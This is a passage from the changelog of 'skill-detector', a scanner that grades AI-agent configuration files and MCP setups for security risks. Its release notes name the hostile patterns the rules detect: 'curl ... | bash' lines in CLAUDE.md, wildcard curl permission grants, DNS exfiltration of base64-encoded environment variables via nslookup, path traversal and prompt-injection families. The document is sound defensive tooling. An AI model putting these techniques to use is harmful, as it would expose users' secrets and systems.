  roughly a quarter of genuine encodings contain a `/` with no `+` and no
  padding, so a slash test discarded a quarter of all genuine payloads. A path
  is several word-like segments — `claude/skills/CORE/USER/Art` flips case on
  ~2% of its character boundaries where random base64 flips on ~33%. The
  shipped test discarded **no** genuine payload in the validation set, and buys
  that by not catching every corpus path token. Found in review of this PR.


### Changed
- **An empty scan no longer grades A.** Discovery is deliberately wider than
  the rules' path gates, so "N files scanned" never meant the agent surface was
  read. When no discovered file is agent surface, the scan now sets
  `no_agent_surface`, emits **no** axes and **no** permissions, warns, and its
  text verdict reads `∅ Nothing checked — no agent configuration files in
  scope` instead of `✓ No concerns`. Previously such a scan reported four A
  grades and a clean verdict, and that A travelled into CI exit codes, badges
  and downstream databases. `--fail-on-axis` already treats a missing axis as
  "nothing to compare", so exit codes are unchanged for graded scans.
- **Schema `1.4` → `1.5`** — additive: `no_agent_surface` (bool, omitempty).
  Registry checksum unmoved (no rule metadata or cap-table change).

- **Text output hides the `quality` axis while nothing drives it.** The axis
  is a reserved slot with zero rules mapped, so the unconditional
  `Quality A` row read as "quality was checked and it's excellent" when
  nothing was checked. The row is skipped when the axis has no driving
  findings and reappears by itself the day a rule lands on the axis.
  **JSON is unchanged** — all four axes stay in the wire format,
  and `--fail-on-axis quality=...` still works. Registry checksum unmoved.

### Fixed
- **`.agents/` is now in scope.** `isInAgentConfigDir` / `inAgentDir` /
  `walkableHiddenDirs` listed every harness dot-dir except `.agents/` — the
  path `npx skills add` installs into, and the convention third-party skill
  registries publish for. A skill installed the standard way was invisible:
  the same fixture graded **F** under `.claude/skills/` and **A** under
  `.agents/skills/` with "0 files scanned". Script extensions
  (`.ts`, `.py`, ...) inside the tree are scanned there like in any other
  agent config dir, which is what catches payloads bundled in `*.test.ts` /
  `conftest.py` that the developer's own test runner executes.

## v0.6.0 — 2026-08-14

Engine-review wave. Registry checksum unchanged
(`589619b6386d2c41`); JSON schema version unchanged (`1.4` — no shape change).

### Fixed
- **`delta` no longer reports churn on line shifts.** Inserting a line
  above a finding shifted its line number, which was part of the match key, so
  every finding below the edit came back as a `resolved` + `new` pair — enough
  to fail a `skilltrust` PR check on a whitespace-only change. Leftovers from
  the exact match are now paired one-for-one on the same key minus the line
  number, and only the residue is reported. `findingKey` and the finding
  payload are unchanged; ruleset checksum unmoved.
- **`delta` output is deterministic.** `new_findings` / `resolved_findings` were
  built by ranging over maps, so their order — and which finding got quoted in
  `axis_explanations` — varied between runs on identical input. Both lists now
  follow scan order.
- **Triage verdicts are no longer mis-applied on key collisions.**
  Verdicts were matched back to findings by `{RuleID, Line}` alone; rules that
  emit several findings with the same key (SD-021: one per MCP server, all on
  line 1; SD-002: several signals per line) got last-write-wins, so a
  `benign_example` verdict for one finding could suppress a `real_threat`
  sibling from axis grading. `triage.Verdict` gains an optional 1-based
  `Index` naming the finding it applies to (additive API); a key claimed by
  two findings or two verdicts now falls to the `unavailable` fail-safe
  instead of being guessed. Shipped verifiers stamp `Index`.
- **Capability inference no longer goes stale silently.** Findings from
  SD-005, SD-006, SD-016, SD-017, SD-019, SD-020, SD-021, SD-022, SD-023 and
  SD-024 now contribute to the reported `permissions`; previously only nine
  rule IDs did, so a skill flagged solely by SD-022 (DNS exfiltration) reported
  no `network` capability at all. The hardcoded switch is now a table
  (`ruleCapabilities` / `capabilityFreeRules`) and a new test fails whenever a
  registered rule is in neither, so new rules cannot skip classification.

### Added
- Schema-version enforcement. `model.SchemaVersion` is now a named
  constant, `cmd/skill-detector/testdata/schema_output.golden` holds real
  `scan --format json` output, and `schema_shapes.json` pins each version to a
  fingerprint of the emitted shape — changing the output without bumping the
  version now fails the build. Bump procedure documented in
  `docs/development-guide.md`.
- README documents the warn-without-failing CI recipe for exit code `1`:
  a `|| [ $? -eq 1 ]` one-liner and an explicit `case` form emitting
  `::warning::`, plus a caution that `|| true` swallows exit `3`.

### Removed
- `rules.RegisterMCPRulesStrict` — dead since v0.2.0, when `--strict-mcp` moved
  to a post-hoc severity upgrade (`applyStrictMCP`) to keep the checksum stable.
  No caller existed in this repo or downstream. Exported-API removal, but only
  in name: calling it produced a registry the CLI never used.
- `cmd/skill-detector::newRegistry` — a hand-maintained duplicate of
  `rules.DefaultRegistry()`, plus the parity test that existed only to catch
  drift between the two. Rule groups are registered in one place again.

## v0.5.0 — 2026-08-05

### Added
- **`SD-024` — MCP Auto-Installed Package Execution** (MEDIUM, transparency
  axis — the first rule on that axis). Flags MCP server entries whose
  `command` is a package auto-fetcher (`npx`, `uvx`, `pipx`, `bunx`): the
  server pulls and runs a registry package at startup rather than a pinned,
  audited binary.
- **Multi-harness coverage.** The harness-agnostic content rules (SD-002,
  SD-003, SD-004, SD-015, SD-016, and friends) now also run over Codex
  CLI/OpenCode (`AGENTS.md`), Gemini CLI (`GEMINI.md`), Cursor
  (`.cursorrules`, `.cursor/rules/*.mdc`), Windsurf (`.windsurfrules`), and
  GitHub Copilot (`.github/copilot-instructions.md`) instruction files.
  `.cursor/mcp.json` and `.vscode/mcp.json` (including VS Code's `servers`
  key) are now classified as MCP configs. Discovery also follows in-tree
  symlinks (e.g. `CLAUDE.md -> AGENTS.md`), previously skipped as
  non-regular files.
- Agent-config-dir script discovery: extensionless and `.zsh` files inside
  `.claude/`, `.codex/`, `.opencode/`, etc. are now walked, closing a blind
  spot where hook scripts without a recognized extension were invisible to
  every content rule.
- **Gitignore-blindness warning.** When `.gitignore` causes an agent config
  path (`.claude/settings.json`, `SKILL.md`, etc.) to be skipped, the scan
  now emits a warning in `ScanResult.Warnings` naming the count and
  suggesting `--scan-all`. Schema version bumped to **1.4**
  (`ScanResult.SchemaVersion`) for the new field.
- `--fail-on-axis` now rejects a misspelled/unknown axis name instead of
  silently treating it as a no-op.

### Changed
- **Nested hooks schema.** SD-019/SD-020 now parse the real Claude Code
  hooks shape (`{"hooks":{"PreToolUse":[{"matcher":"...","hooks":[{"command":"..."}]}]}}`)
  in addition to the old flat shape; hook commands nested under a matcher
  were previously invisible to both rules.
- **Permission-string syntax coverage.** `Bash(curl:*)` (colon-prefix
  wildcard) and `Bash(curl*)` (no-space wildcard, strictly broader than
  `Bash(curl *)`) are now recognized, as is the PowerShell tool shape
  alongside Bash. SD-017/SD-018/SD-023 all share the widened parser.
- **SD-018 reworded and renamed** to "settings.json Redundant Deny Rule"
  (was "Subcommand Limit Bypass"). Deny still wins over allow in Claude
  Code, so a narrower `deny` next to a broader `allow` was never an actual
  bypass — it's a redundant deny that signals the allow is overbroad. The
  rule name, finding message, and remediation now say that instead of
  "bypass".
- **SD-004/SD-013 damping veto narrowed.** The shell-invocation veto used to
  cancel the documentary damping on a bare backtick or bare `>` anywhere on
  the line, which reintroduced the FP class for any Markdown-formatted
  threat-model doc (code-span-wrapped paths, `->` arrows in table rows). A
  backtick now only vetoes via the text it wraps (an imperative command
  span still fires; a path span doesn't), and a single `>` only vetoes when
  it's redirect-shaped (`>` followed by `~`, `./`, `/`, or `$`, not
  preceded by `-`) — `>>` still vetoes unconditionally.
- **SD-023 downgraded High → Medium; SD-018 rename above.** Registry
  checksum moved to `589619b6386d2c41` (severity and name are both part of
  the hashed rule metadata).
- **SD-002 (prompt injection)** now also scans `.claude/commands/`,
  `.claude/agents/`, and skill content files, not just `SKILL.md`/`CLAUDE.md`.
- **SD-001** now scans fenced code blocks inside Markdown
  (`shellFencedLines()` gates the per-line scan to fence contents so prose
  outside a fence doesn't fire) and registers for `.zsh` and extensionless
  scripts, matching the agent-dir script discovery above. Fence scanning is
  restricted to fences tagged `bash`/`sh`/`zsh`/`shell`/`console`/`terminal`
  or untagged — fences tagged with a non-shell language (```` ```js ````,
  ```` ```jsx ````, ```` ```python ````, etc.) are skipped, so a JS/TS
  template literal like `` `Status: ${x}` `` in a code sample no longer
  reads as shell backtick command substitution.
- **Invisible-Unicode coverage** widened to detect the Unicode Tags block
  and bidi-override characters, and now emits one finding per affected line
  instead of one per invisible character (a line with multiple invisible
  characters used to produce a finding per character; it now collapses to
  one finding per line).
- **False-positive damping.** SD-004/SD-013 no longer flag prohibition
  guidance ("never touch `~/.ssh`") or documentary context (Markdown table
  rows, interrogative bullets) as Critical, with a shell-invocation guard so
  an imperative command smuggled into that same shape (piped through a
  table cell) still fires. SD-020 exempts harness-provided `$CLAUDE_*`
  hook variables (e.g. `$CLAUDE_PROJECT_DIR`) from the unquoted-variable
  check — they aren't attacker-controlled.
- Config cascading lookup now also accepts `.skill-detector.yml` (in
  addition to `.skill-detectorrc`, checked first), matching what the
  README has documented.

### Fixed
- Gitignore matching now matches a gitignored directory node by both
  `dirname` and `dirname/` forms — a trailing-slash mismatch previously let
  some gitignored directories slip through.

### Breaking
- **New exit code `3`** for tool errors (bad arguments, unreadable path,
  internal failure), distinct from `1` (findings below threshold) and `2`
  (at/above threshold). Previously tool errors exited `1`, indistinguishable
  from "findings, none above threshold" — a CI gate treating `1` as
  "findings exist" could not tell a scan failure from a clean-ish scan.
- **`--fail-on-axis` with an unknown/misspelled axis now errors** instead of
  silently doing nothing. CI configs with a typo'd axis name (e.g.
  `securty=B`) previously passed every scan unconditionally; they now fail
  fast with an "unknown axis" error.

### Known issues
- **SD-003** (path traversal) fires on ordinary in-package relative paths —
  the majority of its findings on honest input are this false-positive
  class. A proper fix needs to distinguish traversal-shaped paths
  (`../../etc`) from same-package relative references and is deferred to
  its own design pass rather than bundled into this release.

---

## v0.4.0 — 2026-05-29

### Added
- **Triage seam (`pkg/triage`).** A pluggable `Verifier` interface the scanner
  can call to reclassify findings as `real_threat`, `benign_example` or
  `uncertain`. Verdicts are matched back to findings by `(RuleID, Line)`.
- Two inert implementations ship with the engine: `NoopVerifier` (returns
  `uncertain` for everything, leaving the deterministic result untouched) and
  `ScriptedVerifier` (a test double).
- `model.Finding.Triage` — a `*TriageVerdict` carrying classification,
  confidence, rationale and source. **Omitted from JSON when nil**, so
  un-triaged scans produce byte-identical output to v0.3.x.
- `scanner.Options.Verifier` and `scanner.Options.TriageTimeout`.

### Changed
- Axis grading now skips findings that triage has confidently classified as
  benign: `Finding.IsSuppressed()` is true at classification `benign_example`
  with confidence ≥ `model.TriageDemoteThreshold` (0.85).

### Why
- The engine deliberately ships **no** LLM-backed verifier. Adding one here
  would put an API key, a network call and a non-reproducible verdict into a
  CI-facing CLI. The LLM implementation lives in the hosted scanner
  (`skilltrust`), which supplies caching to keep results stable.

### Compatibility
- **Default behavior is unchanged.** With no verifier injected — which is every
  CLI invocation — the scanner takes the same path as v0.3.3 and emits the same
  JSON.
- Triage failures are conservative by construction: a verifier error or a
  timeout marks affected findings `uncertain` / `source: "unavailable"`, so a
  grade can never come out *weaker* because triage broke.
- Registry checksum at this tag: `f1dcffd63faabeb3` (23 rules).

---

## v0.3.3 — 2026-05-25

### Added
- **`SD-023` — `settings.json` Unrestricted Permission Grant** (HIGH,
  permission_hygiene axis). Flags a bare `"*"` in `permissions.allow` in
  `.claude/settings.json` / `settings.local.json`.

### Why
- A wildcard grant slipped past `SD-017`, `SD-018` and `SD-019`, all of which
  look for specific over-broad patterns rather than the total absence of a
  restriction. Caught in the production dogfood: a settings file granting `"*"`
  left `permission_hygiene` at grade A. With `SD-023` the same fixture now
  grades D.

### Compatibility
- New rule → the registry checksum moves. Repositories with a wildcard grant
  will see `permission_hygiene` drop.

---

## v0.3.2 — 2026-05-25

### Added
- **`SD-022` — DNS Exfiltration** (HIGH, security axis). Detects data
  exfiltration over DNS: `dig` / `nslookup` / `drill` / `resolvectl` / `host`
  combined with a dynamically built dotted hostname (`$(...)`, backticks, or a
  variable). Static lookups do not fire.
- **Per-commit recall tripwire** — `cmd/skill-detector/bench_recall_test.go`
  over `testdata/bench/`. Asserts a curated slice of known attacks still grades
  C/D/F, guarding against recall lost to pattern tightening.

### Why
- `SD-022` closes the only miss in the pre-release validation benchmark: a DNS-channel
  exfiltration sample using `nslookup` plus base64-encoded environment variables
  and no HTTP at all. It takes the headline pool to full recall, where both
  `semgrep` and raw grep score far lower on the same set.

### Fixed
- GoReleaser targeted the pre-transfer `velzepooz` org, so release asset upload
  failed with a 307 after the repository moved. Now points at `skilltrust`. The
  Homebrew tap intentionally stays at `velzepooz/homebrew-tap`.

### Compatibility
- New rule → the registry checksum moves.

---

## v0.3.1 — 2026-05-21

### Changed
- `pkg/delta.findingKey` now uses `hash/fnv` (FNV-1a, 64-bit) instead of `crypto/sha256`. Behavior identical; the change signals that the hash is content-addressing only, not a cryptographic primitive. Hash output width widens from 12 to 16 hex chars — internal-only, no wire impact.

## v0.3.0 — 2026-05-21

### Added
- `pkg/delta` package — pure-function trust-score delta computation over two `model.ScanResult`s. Returns per-axis grade movement, finding diff, and axis-downgrade explanations.
- `skill-detector delta <base.json> <head.json>` CLI sub-command emitting JSON or markdown.

### Why
- Powers the new `skilltrust/scan-action@v1` GitHub Action's optional `delta: true` mode.
- Single source of truth for delta semantics shared by the Action and the skillmoss-go PR-comment bot. skillmoss-go's `internal/prbot.ComputeDelta` becomes a thin adapter over `pkg/delta.Compute` in a paired refactor; render snapshots remain byte-identical.

---

## v0.2.1 — 2026-05-19

### Fixed

- **SD-007** no longer flags bare URLs inside `.md`, `.txt`, or `.rst` documentation files. The network-command (`curl`/`wget`/`nc`/`ncat`) and Python-requests branches continue to fire on those file types so real attack patterns (e.g., `curl ... | bash` instructions inside `CLAUDE.md`) are still caught. Documentation links such as `https://github.com/owner/repo.git` in `INSTALL.md` no longer produce high-severity false positives. Surfaced by a `skillmoss-go` dogfood scan of `obra/superpowers`.

---

## v0.2.0 — 2026-05-19 (SP-1: Multi-Axis Engine)

### Scope (BREAKING vs v0.1.x)
- Scanner default behavior: walks only AI-agent configuration files
  (SKILL.md, CLAUDE.md, .claude/settings*.json, .mcp.json) plus
  arbitrary files inside .claude/, .codex/, .opencode/ dirs.
- Honors .gitignore at the scan root (best-effort; missing or
  malformed .gitignore is a no-op).
- Hardcoded skip-list: node_modules, vendor, dist, build, target,
  .next, .git — always skipped, regardless of .gitignore.
- New --scan-all flag bypasses scope tightening and .gitignore
  filtering. For migration or whole-repo audits.
- All 14 pre-existing rules now gate by path; they previously fired on
  any file with a matching extension. This is a breaking change
  vs. v0.1.x default behavior. --scan-all + the rules' built-in
  path gating means walking more files won't reproduce v0.1.x
  output exactly.
- New dependency: github.com/sabhiram/go-gitignore (MIT, zero
  transitive deps).

### Added
- **Multi-axis trust score.** Every scan now emits four A–F grades:
  Security, Permission hygiene, Transparency, Quality. Rendered as
  a "Trust Score" block above the existing findings list.
- **7 new detection rules** covering the `.claude/` configuration
  surface previously not scanned:
  - `SD-015` — `claude_md.sql_injection_by_instruction` (LayerX disclosure, Mar 2026)
  - `SD-016` — `claude_md.comment_and_control` (2026 prompt-injection family)
  - `SD-017` — `settings_json.bash_curl_wildcard` (broad-shell permission grants)
  - `SD-018` — `settings_json.subcommand_limit_bypass` (Apr 2026 CVE shape)
  - `SD-019` — `settings_json.unsanctioned_hook` (out-of-repo hook commands)
  - `SD-020` — `hooks.shell_metacharacter_interpolation` (CVE-2025-59536 family)
  - `SD-021` — `mcp.external_domain_reach` (Trend Micro 2026)
- **New library packages**:
  - `pkg/axes` — `Axis` and `Grade` enums (wire-stable).
  - `pkg/grade` — pure aggregator `Grade(axis, findings) → AxisResult`
    using worst-finding-wins with per-axis caps.
- **CLI flags**:
  - `--fail-on-axis <axis>=<grade>` — repeatable. Exits 2 if axis
    grade is worse than threshold. Combines with `--fail-on`
    (worst wins).
  - `--strict-mcp` — raises `SD-021` from Medium to High.
  - `--axes-only` — emits Trust Score to stdout, findings to
    stderr. For shell pipelines and the PR-comment renderer.
- **CVE reproducer fixtures** under `testdata/cve/` — minimal repos
  reproducing five named 2026 incidents. Used by
  `cmd/skill-detector/cve_repro_test.go` for both Go-API and
  binary-E2E smoke tests.
- **Scanner walks `.claude/`, `.codex/`, `.opencode/`** despite the
  general hidden-directory skip. Other hidden dirs (`.git`,
  `.next`, `node_modules`, etc.) continue to be skipped.

### Changed
- **`Rule` interface gains `Axis() axes.Axis` method**. All existing
  rule implementations now declare an axis. New invariant:
  `baseRule.newFinding` stamps `Finding.Axis = b.axis` so rule code
  cannot forget.
- **`model.Finding` gains `Axis` field** (`json:"axis,omitempty"`).
  Existing consumers continue to parse unchanged.
- **`model.ScanResult` gains `Axes map[axes.Axis]AxisResult`** field
  (`json:"axes,omitempty"`). Existing fields preserved.
- **Existing 6 rule groups** now declare axis assignments
  (`injection/supply_chain/exfiltration/integrity → security`;
  `misconfiguration/access_control → permission_hygiene`). No
  behavior change — only adds axis tag to every emitted Finding.
- **`registry.Checksum()` extended** to include per-rule axis and
  the canonical form of the grade package's cap table + rationale
  templates. Any tampering with rule registration, axis assignment,
  cap-table thresholds, or template strings now invalidates the
  pinned `expectedChecksum` ldflag.
- **Text reporter** prepends a Trust Score block above the existing
  findings list.
- **JSON reporter** emits the new `axes` map and per-finding `axis`
  field (additive).

### Compatibility
- Existing JSON consumers parsing the old shape continue to work —
  new fields are additive and use `omitempty`.
- Existing CLI users running `skill-detector .` see the same
  findings list plus a new Trust Score block above. No flag flip
  required.
- Homebrew tap distribution unchanged. GoReleaser flow unchanged.
- `expectedChecksum` ldflag value differs from v0.1 — release
  artifacts ship with the new value.

### Notes for downstream consumers
- `skillmoss-go` and `skilltrust/scan-action@v1` consumers should
  bump the `skill-detector` dependency to `v0.2.x`.
- Old rule IDs `SD-001..SD-014` are unchanged. New rule IDs are
  `SD-015..SD-021` (skipped `SD-007..SD-013` to avoid collision
  with the original plan numbers).

### Dogfood pass
A release-candidate dogfood pass was run and logged internally.
Verdict: ship-as-is; pre-existing-rule FPs noted as follow-up.

---
